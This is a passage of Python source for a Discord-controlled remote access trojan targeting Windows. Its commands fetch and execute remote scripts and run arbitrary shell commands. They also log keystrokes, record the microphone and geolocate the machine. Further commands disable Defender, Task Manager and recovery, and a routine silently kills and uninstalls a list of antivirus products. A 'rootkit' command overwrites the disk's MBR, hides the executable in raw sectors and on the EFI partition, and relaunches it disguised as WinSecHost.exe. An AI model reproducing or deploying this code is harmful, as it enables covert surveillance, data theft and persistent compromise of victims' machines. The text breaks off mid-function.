            with builtins.open(path, "wb") as f:
                f.write(await resp.read())
    cmd = f'powershell -ExecutionPolicy Bypass -File "{path}"' if ext == ".ps1" else f'cmd.exe /c "{path}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "The script ran but produced no output."
    await ctx.send(embed=create_embed("⚙️ Script Executed", f"The script was downloaded and executed, this is what it returned:\n```{out}```", 0x0084ff))


@bot.command()
async def blacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE process_name = ?", (process,))
    if c.fetchone():
        await ctx.send(embed=create_embed("Error", "That process is already on the blacklist.", 0xFF0000))
    else:
        c.execute("INSERT INTO blacklist VALUES (?)", (process,))
        conn.commit()
        await ctx.send(embed=create_embed("🚫 Blacklist", f"**{process}** will now be killed every time it starts.", 0xFF0000))
    conn.close()


@bot.command()
async def unblacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM blacklist WHERE process_name = ?", (process,))
    conn.commit()
    conn.close()
    await ctx.send(embed=create_embed("✅ Unblacklist", f"**{process}** was removed from the blacklist and can run again.", 0x00FF00))


@bot.command(aliases=["block-domain"])
async def block_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "a") as f:
        f.write(f"\n127.0.0.1 {domain}\n")
    await ctx.send(embed=create_embed("🚫 Domain Blocked", f"`{domain}` now resolves to localhost through the hosts file.", 0xff0000))


@bot.command(aliases=["unblock-domain"])
async def unblock_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "r") as f:
        lines = f.readlines()
    with builtins.open(hosts_path, "w") as f:
        for line in lines:
            if domain not in line:
                f.write(line)
    await ctx.send(embed=create_embed("✅ Domain Unblocked", f"Every hosts entry containing `{domain}` was deleted.", 0x00ff00))


@bot.command(aliases=["block-website"])
async def block_website(ctx, *, url: str):
    await block_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["unblock-website"])
async def unblock_website(ctx, *, url: str):
    await unblock_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["ip-locate"])
async def ip_locate(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org") as r:
                ip_addr = await r.text()
            async with session.get(f"http://ip-api.com/json/{ip_addr}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query") as r:
                data = await r.json()
        if data.get("status") != "success":
            await ctx.send(embed=create_embed("Error", data.get("message", "The lookup service rejected the request."), 0xff0000))
            return
        e = create_embed("📍 IP Information", "The public address of this machine was resolved to the following location.", 0x3498db)
        e.add_field(name="IP", value=f"```{data.get('query')}```", inline=False)
        e.add_field(name="City", value=data.get("city") or "N/A", inline=True)
        e.add_field(name="Country", value=data.get("country") or "N/A", inline=True)
        e.add_field(name="Coordinates", value=f"{data.get('lat')}, {data.get('lon')}", inline=True)
        e.add_field(name="ISP", value=data.get("isp") or "N/A", inline=False)
        e.add_field(name="AS", value=data.get("as") or "N/A", inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The geolocation lookup failed: {e}", 0xff0000))


@bot.command(aliases=["admin-check"])
async def admin_check(ctx):
    if is_admin():
        await ctx.send(embed=create_embed("👔 Admin", "The process is running with administrator rights.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("👔 No admin", "The process is running without administrator rights.", 0xff0000))


@bot.command(aliases=["idle-time"])
async def idle_time(ctx):
    await ctx.send(embed=create_embed("⌚ Idle Time", f"Nobody has touched the keyboard or the mouse for **{int(get_idle_time())}** seconds.", 0x3498db))

def ps(cmd):
    return subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
         "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        creationflags=subprocess.CREATE_NO_WINDOW
    )


def _run_ps(command):
    try:
        r = ps(command)
        return (r.stdout or "").strip() if r else ""
    except Exception:
        return ""


def cmd_run(command):
    return subprocess.run(
        f"chcp 65001>nul & {command}", shell=True, capture_output=True,
        text=True, encoding="utf-8", errors="replace",
        creationflags=subprocess.CREATE_NO_WINDOW
    )


def exec_capture(command):
    out = (cmd_run(command).stdout or "").strip()
    return f"Executed command: {command}\nstdout:\n{out}\nEnd of command stdout"


def chunk_text(text, size=1900):
    text = text or ""
    return [text[i:i + size] for i in range(0, max(len(text), 1), size)]


async def send_long(target, text, code=True):
    text = (text or "").strip() or "(No output)"
    for c in chunk_text(text):
        await target.send(f"```\n{c}\n```" if code else c)


def run_script_capture(path, *args):
    buf = io.StringIO()
    old = sys.argv
    try:
        sys.argv = [path, *args]
        with contextlib.redirect_stdout(buf):
            runpy.run_path(path, run_name="__main__")
    except SystemExit:
        pass
    except Exception as e:
        buf.write(f"\n[error] {e}\n")
    finally:
        sys.argv = old
    return buf.getvalue()

@bot.command()
async def cmd(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    out = ((cmd_run(command).stdout or "") + (cmd_run(command).stderr or "")).strip()
    await ctx.send(embed=create_embed("⬛ CMD", f"The command was executed through cmd.exe and returned the output below.\n```{(out or 'Executed (No output)')[-1900:]}```", 0x0084ff))


@bot.command()
async def powershell(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    result = ps(command)
    out = ((result.stdout or "") + (result.stderr or "")).strip()
    await ctx.send(embed=create_embed("🟦 PowerShell", f"The command was executed through PowerShell and returned the output below.\n```{(out or 'Executed (No output)')[-1900:]}```", 0x0084ff))


@bot.command()
async def key(ctx, *, keys: str):
    text = keys.replace("[ENTER]", "\n").replace("[SPACE]", " ").replace("[TAB]", "\t").replace("[ESC]", "\x1b")
    pyautogui.typewrite(text, interval=0.01)
    await ctx.send(embed=create_embed("Keys", f"The following text was typed into the focused window: `{keys[:50]}`", 0x00ff00))


@bot.command(aliases=["keylogger-enable"])
async def keylogger_enable(ctx):
    global keylogger_active
    keylogger_active = True
    await ctx.send(embed=create_embed("🎹 Keylogger", "The global keyboard listener is active again and every keystroke will be buffered.", 0x00ff00))


@bot.command(aliases=["keylogger-disable"])
async def keylogger_disable(ctx):
    global keylogger_active
    keylogger_active = False
    await ctx.send(embed=create_embed("🎹 Keylogger", "The global keyboard listener was disabled and keystrokes are no longer buffered.", 0xff0000))


@bot.command(aliases=["keylog"])
async def keylog_dump(ctx):
    if flush_keylog():
        await ctx.send(embed=create_embed("🎹 Keylogger", "The buffer was flushed and its contents were sent to the keys channel.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("🎹 Keylogger", "The buffer was already empty, there was nothing to send.", 0x3498db))


@bot.command(aliases=["record"])
async def record_now(ctx, seconds: int = 10):
    await ctx.message.add_reaction("🎙️")
    try:
        await asyncio.to_thread(record_and_send, seconds)
        await ctx.send(embed=create_embed("🎙️ Recording", f"A **{seconds}** second clip was recorded from the microphone and sent to the microphone channel.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The microphone could not be recorded: {e}", 0xff0000))


@bot.command()
async def website(ctx, *, url: str):
    subprocess.Popen(["start", url], shell=True)
    await ctx.send(embed=create_embed("🌐 Web", f"`{url}` was opened in the default browser.", 0x00ff00))


@bot.command(aliases=["disable-cmd"])
async def disable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 1 /f')
    await ctx.send(embed=create_embed("💻 CMD", "The command prompt was disabled for the current user through policy.", 0xff0000))


@bot.command(aliases=["enable-cmd"])
async def enable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("💻 CMD", "The command prompt was enabled again for the current user.", 0x00ff00))


@bot.command(aliases=["disable-taskmgr"])
async def disable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    os.system("taskkill /f /im taskmgr.exe")
    await ctx.send(embed=create_embed("📊 Task Manager", "The Task Manager was disabled through policy and its open window was closed.", 0xFF0000))


@bot.command(aliases=["enable-taskmgr"])
async def enable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("📊 Task Manager", "The Task Manager was enabled again and can be opened normally.", 0x00ff00))


@bot.command(aliases=["disable-defender"])
async def disable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $true")
    await ctx.send(embed=create_embed("🛡️ Defender", "The real time protection of Defender was turned off.", 0xff0000))


@bot.command(aliases=["enable-defender"])
async def enable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $false")
    await ctx.send(embed=create_embed("🛡️ Defender", "The real time protection of Defender was turned back on.", 0x00ff00))


@bot.command(aliases=["deactivate-windows"])
async def deactivate_windows(ctx):
    subprocess.run(["cscript", "//nologo", r"C:\Windows\System32\slmgr.vbs", "/upk"],
                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=create_embed("🪟 Windows", "The Windows product key was removed and the licence is now deactivated.", 0xff0000))


@bot.command(aliases=["disable-reagentc"])
async def disable_reagentc(ctx):
    subprocess.run(["reagentc", "/disable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "The recovery environment was disabled and WinRE can no longer be booted.", 0xff0000))


@bot.command(aliases=["enable-reagentc"])
async def enable_reagentc(ctx):
    subprocess.run(["reagentc", "/enable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "The recovery environment was enabled again.", 0x00ff00))


@bot.command(aliases=["kill-pc"])
async def kill_pc(ctx):
    await ctx.send(embed=create_embed("🚨 Confirmation", "This will destroy the installation and leave the machine unbootable. Type `confirm-kill` to continue.", 0xff0000))


@bot.command(aliases=["set-dns"])
async def dns(ctx, dns1: str = None, dns2: str = None):
    if not dns1:
        await ctx.send(embed=create_embed("Error", "You have to give at least a primary DNS server, for example `.set-dns 1.1.1.1`.", 0xffa500))
        return
    await ctx.message.add_reaction("🌐")
    dns_list = f'"{dns1}"' if not dns2 else f'"{dns1}","{dns2}"'
    ps_script = f'''
$adapters = Get-NetAdapter | Where-Object {{ $_.Status -eq "Up" }}
foreach ($adapter in $adapters) {{
    Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses ({dns_list}) -ErrorAction SilentlyContinue
}}
'''
    result = ps(ps_script)
    if result.returncode == 0:
        await ctx.send(embed=create_embed("🌐 DNS Updated", f"Every connected adapter now uses `{dns1}` as its resolver.", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", f"The DNS servers could not be changed:\n```{result.stderr[-1800:]}```", 0xff0000))

AV_KW = ["avast", "avg", "kaspersky", "eset", "bitdefender", "mcafee", "norton",
         "symantec", "malwarebytes", "avira", "sophos", "fortinet", "fortiedr",
         "panda", "trend micro", "g data", "webroot", "crowdstrike", "sentinelone",
         "cylance", "carbon black", "quick heal", "comodo", "dr.web", "drweb"]

AV_CLI = [
    (r"Kaspersky Lab", "avp.com", ["ADDEXCLUSION"]),
]

_AV_PS = r'''
$paths = @(@PATHS@)
$kw = @(@KW@)
$found = @()
try {
  $sc = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA SilentlyContinue
  foreach ($p in $sc) { if ($p.displayName -notmatch 'Defender|Windows Security') { $found += $p.displayName } }
} catch {}
Get-CimInstance Win32_Service | ForEach-Object {
  $s = "$($_.DisplayName) $($_.PathName)"
  foreach ($k in $kw) {
    if ($s -match $k) { $found += $_.DisplayName; break }
  }
}
($found | Sort-Object -Unique) -join '|'
'''

_AV_UNINST = r'''
$kw = @(@KW@)
$keys = @(
 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
$hits = @()
foreach ($k in $keys) {
  Get-ItemProperty $k -EA SilentlyContinue | ForEach-Object {
    $n = "$($_.DisplayName)"
    foreach ($x in $kw) {
      if ($n -match $x -and $_.UninstallString) { $hits += $_; break }
    }
  }
}
foreach ($h in $hits) {
  $u = $h.UninstallString
  if ($u -match 'msiexec') {
    if ($u -match '\{[0-9A-Fa-f\-]{36}\}') {
      $g = $Matches[0]
      Start-Process msiexec.exe -ArgumentList "/x $g /qn /norestart" -Wait -WindowStyle Hidden
    }
  } else {
    $exe = ($u -split '"')[1]
    if (-not $exe) { $exe = ($u -split ' ')[0] }
    if ($exe -and (Test-Path $exe)) {
      Start-Process $exe -ArgumentList '/S','/silent','/verysilent','/qn','/norestart' -Wait -WindowStyle Hidden
    }
  }
}
'''


def _av_detect():
    st = _state_read() or {}
    paths = [s["exe"] for s in (st.get("slots") or []) if s.get("exe")]
    if st.get("dir"):
        paths.append(st["dir"])
    ps = _AV_PS.replace("@PATHS@", ",".join("'{}'".format(p.replace("'", "''")) for p in paths)) \
                .replace("@KW@", ",".join("'{}'".format(k) for k in AV_KW))
    r = _ps(ps)
    out = (r.stdout or "").strip() if r else ""
    return [x for x in out.split("|") if x.strip()], paths


def purge_av():
    st = _state_read() or {}
    paths = [s["exe"] for s in (st.get("slots") or []) if s.get("exe")]
    paths += [st.get("dir") or "", os.environ.get("TEMP", r"C:\Windows\Temp")]
    paths = [p for p in paths if p]

    for p in paths:
        _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(p))
        _ps('Add-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(p))

    dpol = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    _reg_add(dpol, "DisableAntiSpyware", 1, "REG_DWORD")
    _reg_add(dpol, "DisableAntiVirus", 1, "REG_DWORD")
    for v in ("DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
              "DisableOnAccessProtection", "DisableScanOnRealtimeEnable",
              "DisableIOAVProtection", "DisableScriptScanning"):
        _reg_add(dpol + r"\Real-Time Protection", v, 1, "REG_DWORD")
    _ps("Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true "
        "-DisableBehaviorMonitoring $true -DisableScriptScanning $true "
        "-MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue")

    for folder, cli, verbs in AV_CLI:
        for base in (r"C:\Program Files (x86)\{}".format(folder), r"C:\Program Files\{}".format(folder)):
            if not os.path.isdir(base):
                continue
            for root, _, files in os.walk(base):
                if cli in files:
                    exe = os.path.join(root, cli)
                    for p in paths:
                        subprocess.run([exe] + verbs + [p], capture_output=True, creationflags=_CNW)

    detected, _ = _av_detect()
    if detected:
        _ps("Get-Process | ForEach-Object { foreach ($k in @({})) {{ "
            "if ($_.ProcessName -match $k) {{ Stop-Process -Id $_.Id -Force -EA SilentlyContinue }} }} }}"
            .format(",".join("'{}'".format(k) for k in AV_KW)))
        _ps("Get-CimInstance Win32_Service | ForEach-Object { "
            "$s = \"$($_.DisplayName) $($_.PathName)\"; foreach ($k in @({})) {{ "
            "if ($s -match $k) {{ sc.exe stop \"$($_.Name)\" 2>$null | Out-Null; "
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\$($_.Name)\" /v Start /t REG_DWORD /d 4 /f | Out-Null; break }} }} }}"
            .format(",".join("'{}'".format(k) for k in AV_KW)))

        for name in detected:
            key = next((k for k in AV_KW if k in name.lower()), None)
            if not key:
                continue
            if key == "kaspersky" and os.path.exists(r"C:\Program Files (x86)\Kaspersky Lab"):
                continue
            _ps(_AV_UNINST.replace("@KW@", "'{}'".format(key)))

@bot.command(aliases=["coords", "coordinates"])
async def get_coords(ctx):
    await ctx.message.add_reaction("📍")
    ps_script = r'''
Add-Type -AssemblyName System.Device
$w = New-Object System.Device.Location.GeoCoordinateWatcher
$w.Start()
$t = 0
while (($w.Status -ne "Ready") -and ($w.Permission -ne "Denied") -and ($t -lt 20)) { Start-Sleep -Milliseconds 250; $t++ }
if ($w.Permission -eq "Denied") { Write-Output '{"error":"denied"}' }
else { $l = $w.Position.Location; if ($l.IsUnknown) { Write-Output '{"error":"unknown"}' } else { @{lat=$l.Latitude;lon=$l.Longitude;acc=$l.HorizontalAccuracy} | ConvertTo-Json } }
'''
    lat = lon = acc = None
    try:
        raw = ps(ps_script).stdout.strip()
        if raw:
            data = json.loads(raw)
            if "error" not in data:
                lat, lon, acc = data.get("lat"), data.get("lon"), data.get("acc")
    except Exception:
        pass
    if lat is None or lon is None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json/?fields=lat,lon") as r:
                    data = await r.json()
            lat, lon, acc = data.get("lat"), data.get("lon"), "approximate, based on the IP"
        except Exception:
            pass
    if lat is None:
        await ctx.send(embed=create_embed("Error", "The location could not be resolved by the system sensor nor by the IP.", 0xff0000))
        return
    await ctx.send(embed=create_embed("📍 Coordinates", f"The machine is around `{lat}, {lon}` ({acc}).\nhttps://www.google.com/maps?q={lat},{lon}", 0x0084ff))


@bot.command(aliases=["mount-iso", "mount"])
async def mount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "You have to give the path to an image, for example `.mount disk.iso`.", 0xffa500))
        return
    path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
    result = ps(f"$i = Mount-DiskImage -ImagePath '{path}' -PassThru; ($i | Get-Volume).DriveLetter")
    await ctx.send(embed=create_embed("💿 ISO Mounted", f"The image was mounted on drive `{result.stdout.strip()}`.", 0x0084ff))


@bot.command(aliases=["unmount-iso", "unmount"])
async def unmount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "You have to give the image path or the drive letter, for example `.unmount E`.", 0xffa500))
        return
    if len(filename) == 1 and filename.isalpha():
        ps(f"Dismount-DiskImage -DevicePath \\\\.\\{filename}:")
    else:
        path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
        ps(f"Dismount-DiskImage -ImagePath '{path}'")
    await ctx.send(embed=create_embed("⏏️ ISO Unmounted", f"`{filename}` was dismounted and its drive letter is free again.", 0x0084ff))


@bot.command(aliases=["enable-device"])
async def enable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "You have to give the device index, for example `.enable-device 3`.", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Enable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🔌 Device", out if out != "NOT_FOUND" else f"There is no device in position {index}.", 0x0084ff))


@bot.command(aliases=["disable-device"])
async def disable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "You have to give the device index, for example `.disable-device 3`.", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Disable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🚫 Device", out if out != "NOT_FOUND" else f"There is no device in position {index}.", 0x0084ff))

_RK_MAGIC = b"LMBOOT1"
_RK_SLOT = b"LMSLOT1\x00"
_RK_TAIL = 16 * 1024 * 1024
_RK_CODE = bytes.fromhex(
    "fa31c08ed0bc007cfb31c08ec08ed8be007cbf0006b90002f3a4ea2006000090"
    "8816f007c606f1070331c08ec0bb007cb402b001b500b102b6008a16f007cd13"
    "730cfe0ef10775e1cd18faf4ebfd8a16f00731c08ec031dbea007c0000"
)


def _rk_dir():
    d = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
                     "Microsoft", "Windows", "Caches", "rk")
    os.makedirs(d, exist_ok=True)
    return d


def _rk_open():
    return open(r"\\.\PhysicalDrive0", "r+b", buffering=0)


def _rk_read(off, n):
    with _rk_open() as f:
        f.seek(off)
        data = f.read(n)
    if len(data) != n:
        raise OSError("short read at {} ({} of {})".format(off, len(data), n))
    return data


def _rk_write(off, data):
    with _rk_open() as f:
        f.seek(off)
        f.write(data)
        f.flush()
        os.fsync(f.fileno())


def _rk_size():
    with _rk_open() as f:
        return f.seek(0, 2)


def _rk_stub(orig):
    if len(_RK_CODE) > 0x100:
        raise ValueError("stub does not fit below 0x100")
    b = bytearray(_RK_CODE)
    b += b"\x00" * (0x100 - len(b))
    b += _RK_MAGIC
    b += b"\x00" * (0x1B8 - len(b))
    b += orig[0x1B8:0x200]
    return bytes(b[:512])


def _rk_entries(orig):
    return [orig[0x1BE + i * 16:0x1CE + i * 16] for i in range(4)]


def _rk_preflight(orig):
    blocks, warnings = [], []
    if not _is_admin():
        blocks.append("administrator required")
    if len(orig) != 512:
        return blocks + ["LBA0 did not return 512 bytes"], warnings
    if orig[510:512] != b"\x55\xaa":
        return blocks + ["LBA0 has no 55AA signature"], warnings
    if _RK_MAGIC in orig[:0x110]:
        return blocks + ["MBR already instrumented"], warnings

    ents = _rk_entries(orig)
    if any(e[4] == 0xEE for e in ents):
        warnings.append("GPT disk: this is a protective MBR, the stub only runs under CSM")
    active = [e for e in ents if e[4]]
    if not active:
        return blocks + ["empty partition table"], warnings

    starts = [struct.unpack("<I", e[8:12])[0] for e in active]
    if 0 in starts:
        blocks.append("a partition starts at LBA0")
    if 1 in starts:
        blocks.append("a partition occupies LBA1, where the backup would go")

    try:
        if _rk_size() < 4 * 1024 * 1024:
            blocks.append("disk too small")
    except Exception as e:
        blocks.append("disk not readable: {}".format(e))
    return blocks, warnings


def _rk_install():
    orig = _rk_read(0, 512)
    blocks, warnings = _rk_preflight(orig)
    if blocks:
        return "Nothing written:\n· " + "\n· ".join(blocks)

    stub = _rk_stub(orig)
    if len(stub) != 512:
        return "Malformed stub, nothing written."

    d = _rk_dir()
    bak = os.path.join(d, "mbr.bak")
    with open(bak, "wb") as f:
        f.write(orig)
    with open(bak + ".sha256", "w", encoding="ascii") as f:
        f.write(hashlib.sha256(orig).hexdigest())
    with open(os.path.join(d, "journal.json"), "w", encoding="utf-8") as f:
        json.dump({"when": int(time.time()),
                   "sha_original": hashlib.sha256(orig).hexdigest(),
                   "sha_stub": hashlib.sha256(stub).hexdigest()}, f)

    _rk_write(512, orig)
    if _rk_read(512, 512) != orig:
        return "LBA1 does not take the write. MBR untouched."

    _rk_write(0, stub)
    if _rk_read(0, 512) != stub:
        _rk_write(0, orig)
        if _rk_read(0, 512) != orig:
            return ("MBR write did not verify and the rollback did not verify either. "
                    "Do not reboot blind: backup at {}".format(bak))
        return "MBR rejected the write. Rolled back, everything as it was."

    msg = "MBR instrumented and verified. Original at LBA1 and at {}.".format(bak)
    if warnings:
        msg += "\n\nWarnings:\n· " + "\n· ".join(warnings)
    return msg


def _rk_unmbr():
    d = _rk_dir()
    bak = os.path.join(d, "mbr.bak")
    cands = []
    if os.path.exists(bak):
        try:
            with open(bak, "rb") as f:
                cands.append(("file", f.read(512)))
        except Exception:
            pass
    try:
        cands.append(("LBA1", _rk_read(512, 512)))
    except Exception:
        pass

    expected = None
    try:
        with open(os.path.join(d, "journal.json"), "r", encoding="utf-8") as f:
            expected = json.load(f).get("sha_original")
    except Exception:
        pass

    orig = None
    source = None
    for name, data in cands:
        if len(data) != 512 or data[510:512] != b"\x55\xaa":
            continue
        if expected and hashlib.sha256(data).hexdigest() != expected:
            continue
        orig, source = data, name
        break

    if orig is None:
        if expected:
            return "No copy matches the journal sha. Not restored."
        return "No valid copy (neither file nor LBA1). Not restored."

    _rk_write(0, orig)
    if _rk_read(0, 512) != orig:
        return "Restored from {} but the read-back does not match. Check before rebooting.".format(source)
    return "Original MBR restored from {} and verified.".format(source)


def _rk_slot_off():
    off = ((_rk_size() - _RK_TAIL) // 512) * 512
    return max(off, 1024 * 1024)


def _rk_slot():
    exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
    with open(exe, "rb") as f:
        data = f.read()
    if len(data) < 4096:
        return "Executable is too small, no copy stored."
    hdr = _RK_SLOT + struct.pack("<Q", len(data)) + hashlib.sha256(data).digest()
    hdr += b"\x00" * (512 - len(hdr))
    off = _rk_slot_off()
    _rk_write(off, hdr + data)
    if _rk_read(off, 512) != hdr:
        return "Header does not verify, copy is doubtful."
    return "Raw copy at offset {} ({} KB).".format(off, len(data) // 1024)


def _rk_recover():
    off = _rk_slot_off()
    hdr = _rk_read(off, 48)
    if hdr[:8] != _RK_SLOT:
        return "No raw copy in the slot."
    n = struct.unpack("<Q", hdr[8:16])[0]
    if not (4096 < n < 200 * 1024 * 1024):
        return "Corrupt header."
    data = _rk_read(off + 512, n)
    if hashlib.sha256(data).digest() != hdr[16:48]:
        return "SHA mismatch, corrupt copy."
    if data[:2] != b"MZ":
        return "Content is not a PE."
    dst = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "WinSecHost.exe")
    with open(dst, "wb") as f:
        f.write(data)
    subprocess.Popen([dst], close_fds=True)
    return "Recovered and launched from {}.".format(dst)


def _rk_esp():
    exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
    with open(exe, "rb") as f:
        data = f.read()
    if len(data) < 4096:
        return "Executable is too small, not copied."
    name = os.path.basename(exe)
    for letter in "ZYXWVUTSRQ":
        drive = letter + ":"
        if os.path.exists(drive + "\\"):
            continue
        r = subprocess.run(["mountvol", drive, "/S"], capture_output=True, text=True)
        if r.returncode != 0 or not os.path.isdir(drive + "\\EFI"):
            continue
        try:
            p = os.path.join(drive + "\\", "EFI", "Microsoft", "Boot")
            os.makedirs(p, exist_ok=True)
            with open(os.path.join(p, name), "wb") as f:
                f.write(data)
            return "Copy on the ESP ({}\\EFI\\Microsoft\\Boot\\{}).".format(letter, name)
        except Exception as e:
            return "ESP mounted but copy failed: {}".format(e)
        finally:
            subprocess.run(["mountvol", drive, "/D"], capture_output=True)
    return "No mountable EFI partition found."


def _rk_esp_clean():
    hit = []
    for letter in "ZYXWVUTSRQ":
        drive = letter + ":"
        if os.path.exists(drive + "\\"):
            continue
        r = subprocess.run(["mountvol", drive, "/S"], capture_output=True, text=True)
        if r.returncode != 0 or not os.path.isdir(drive + "\\EFI"):
            continue
        try:
            for sub in ("EFI\\Microsoft\\Boot", "EFI\\Boot"):
                p = os.path.join(drive + "\\", sub, os.path.basename(sys.executable))
                if os.path.exists(p):
                    os.remove(p)
                    hit.append(p)
        finally:
            subprocess.run(["mountvol", drive, "/D"], capture_output=True)
    return "Deleted {} files from the ESP.".format(len(hit))


def _rk_report():
    out = []
    try:
        orig = _rk_read(0, 512)
        if _RK_MAGIC in orig[:0x110]:
            out.append("MBR: **instrumented**")
            out.append("Stub: " + ("verifies" if orig == _rk_stub(orig) else "**does not match**"))
        elif any(e[4] == 0xEE for e in _rk_entries(orig)):
            out.append("MBR: clean (GPT, the stub would only run under CSM)")
        else:
            out.append("MBR: clean")
    except Exception as e:
        out.append("MBR: error {}".format(e))
    try:
        out.append("Disk: {:.1f} GB".format(_rk_size() / 1024 ** 3))
    except Exception:
        out.append("Disk: not readable")
    try:
        out.append("Raw slot: " + ("**present**" if _rk_read(_rk_slot_off(), 8) == _RK_SLOT else "empty"))
    except Exception:
        out.append("Raw slot: error")
    out.append("Backup: " + ("yes" if os.path.exists(os.path.join(_rk_dir(), "mbr.bak")) else "no"))
    return "\n".join(out)


@bot.command(name="rootkit")
async def rootkit(ctx, sub: str = "status"):
    sub = (sub or "status").lower()
    msg = None
    try:
        if sub == "status":
            msg = _rk_report()
        elif sub == "mbr":
            msg = _rk_install()
        elif sub == "unmbr":
            msg = _rk_unmbr()
        elif sub == "slot":
            msg = _rk_slot()
        elif sub == "recover":
            msg = _rk_recover()
        elif sub == "esp":
            msg = _rk_esp()
        elif sub == "esp-clean":
            msg = _rk_esp_clean()
        elif sub == "install":
            msg = "\n".join([_rk_install(), _rk_slot(), _rk_esp()])
        elif sub == "clean":
            msg = "\n".join([_rk_unmbr(), _rk_esp_clean()])
            try:
                os.remove(os.path.join(_rk_dir(), "mbr.bak"))
                os.remove(os.path.join(_rk_dir(), "mbr.bak.sha256"))
                os.remove(os.path.join(_rk_dir(), "journal.json"))
            except Exception:
                pass
        else:
            msg = "Valid subcommands are: status, mbr, unmbr, slot, recover, esp, esp-clean, install and clean."
    except Exception as e:
        msg = "Failed: {}".format(e)
        _crash("rootkit", traceback.format_exc())
    await ctx.send(embed=create_embed("Rootkit .{}".format(sub), msg[:1900], 0x5865F2))

@bot.command(aliases=["speedtest", "speed"])
async def speed_test(ctx):
    await ctx.message.add_reaction("🚀")
    ps_script = '''
$cli = Get-Command speedtest -ErrorAction SilentlyContinue
if (-not $cli) { winget install --id Ookla.Speedtest --silent --accept-source-agreements --accept-package-agreements | Out-Null }
speedtest -f json
'''
    raw = ps(ps_script).stdout.strip()
    if raw.startswith("{"):
        data = json.loads(raw)
        dl = round(data["download"]["bandwidth"] * 8 / 1e6, 2)
        ul = round(data["upload"]["bandwidth"] * 8 / 1e6, 2)
        ping = round(data["ping"]["latency"], 2)
